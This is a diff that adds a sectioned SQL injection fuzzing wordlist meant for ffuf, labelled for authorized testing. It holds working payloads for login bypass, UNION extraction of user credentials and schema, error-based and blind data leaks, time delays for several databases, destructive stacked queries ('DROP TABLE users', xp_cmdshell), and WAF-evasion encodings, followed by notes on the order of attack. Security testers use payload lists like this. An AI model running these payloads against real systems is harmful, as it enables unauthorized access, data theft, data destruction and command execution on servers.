@@ -1,0 +1,186 @@
+# ============================================================
+# SQL Injection Fuzzing Wordlist
+# Usage: ffuf -u http://example.com/item?id=FUZZ -w this_file.txt
+# For authorized security testing only.
+# ============================================================
+
+# ---------------------------------------
+# SECTION 1: Detection / breaking probes
+# ---------------------------------------
+'
+"
+`
+')
+")
+`)
+'))
+"))
+;
+--
+#
+/*
+*/
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+' OR ''='
+' OR 1=1 LIMIT 1--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 100--
+1 AND 1=1
+1 AND 1=2
+1' AND '1'='1
+1' AND '1'='2
+
+# ---------------------------------------
+# SECTION 2: Authentication bypass
+# ---------------------------------------
+admin' --
+admin' #
+admin'/*
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+') OR '1'='1--
+') OR ('1'='1--
+admin' OR '1'='1
+admin" OR "1"="1
+' OR 'x'='x
+' OR 'a'='a
+'='
+' OR '1'='1' -- -
+' OR '1'='1' #
+1'='1
+'--
+'#
+'or 1=1 or ''='
+' UNION SELECT 1,'admin','password'--
+
+# ---------------------------------------
+# SECTION 3: UNION-based
+# ---------------------------------------
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION SELECT username,password FROM users--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns--
+' UNION SELECT @@version--
+' UNION SELECT database()--
+' UNION SELECT user()--
+1 UNION SELECT 1,2,3
+1' UNION SELECT 1,2,3-- -
+
+# ---------------------------------------
+# SECTION 4: Error-based
+# ---------------------------------------
+' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--
+' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CAST((SELECT @@version) AS int)--
+' AND GTID_SUBSET(@@version,0)--
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--
+' AND EXP(~(SELECT * FROM (SELECT version())a))--
+
+# ---------------------------------------
+# SECTION 5: Boolean-based blind
+# ---------------------------------------
+' AND 1=1--
+' AND 1=2--
+' AND SLEEP(0)--
+' AND 'a'='a
+' AND 'a'='b
+1 AND 1=1
+1 AND 1=2
+' AND (SELECT SUBSTRING(@@version,1,1))='5'--
+' AND (SELECT SUBSTRING(@@version,1,1))='9'--
+' AND (SELECT COUNT(*) FROM users)>0--
+' AND (SELECT LENGTH(database()))>0--
+' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
+
+# ---------------------------------------
+# SECTION 6: Time-based blind (per-DBMS)
+# ---------------------------------------
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; SELECT SLEEP(5)--
+' AND SLEEP(5)#
+1' AND SLEEP(5) AND '1'='1
+'; WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5'#
+' OR pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+' AND 1=(SELECT 1 FROM PG_SLEEP(5))--
+' AND DBMS_LOCK.SLEEP(5)=1--
+' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+'||DBMS_LOCK.SLEEP(5)--
+' AND (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)>0--
+
+# ---------------------------------------
+# SECTION 7: Stacked queries
+# ---------------------------------------
+'; DROP TABLE users--
+'; INSERT INTO users VALUES('hacker','pass')--
+1'; SELECT SLEEP(5)--
+1; SELECT SLEEP(5)--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC master..xp_cmdshell 'whoami'--
+
+# ---------------------------------------
+# SECTION 8: Comment style / DBMS-specific syntax variants
+# ---------------------------------------
+'-- -
+' #
+' /*
+' %00
+'/**/OR/**/1=1
+'/**/UNION/**/SELECT/**/1,2,3--
+'+OR+1=1--
+'%20OR%201=1--
+'||'1'='1
+'||1=1--
+'or''='
+'or 1=1--
+1;SELECT 1
+1) OR (1=1--
+1)) OR ((1=1--
+
+# ---------------------------------------
+# SECTION 9: WAF bypass / case & encoding obfuscation
+# ---------------------------------------
+' oR 1=1--
+' Or 1=1--
+' UnIoN SeLeCt 1,2,3--
+'%20OR%201=1--
+'%0AOR%0A1=1--
+'/**/OR/**/1=1--
+'+OR+1=1
+'%09OR%091=1--
+' /*!50000OR*/ 1=1--
+' /*!UNION*/ /*!SELECT*/ 1,2,3--
+'%252fOR%252f1=1--
+0x27204f52203d3d2031
+
+# ---------------------------------------
+# NOTES
+# ---------------------------------------
+# - Start with Section 1 to detect if input is unsanitized (errors,
+#   behavior change), then narrow to the DBMS via Section 6 time-based
+#   tests (each DBMS has a distinct sleep syntax).
+# - Use Section 3 UNION payloads only after confirming the column count
+#   via ORDER BY (Section 1).
+# - Section 7 stacked queries only work on stacked-query-capable
+#   connectors (e.g. MSSQL, PDO in some configs) — not MySQL via mysqli.
+# - Only use against systems you are explicitly authorized to test.
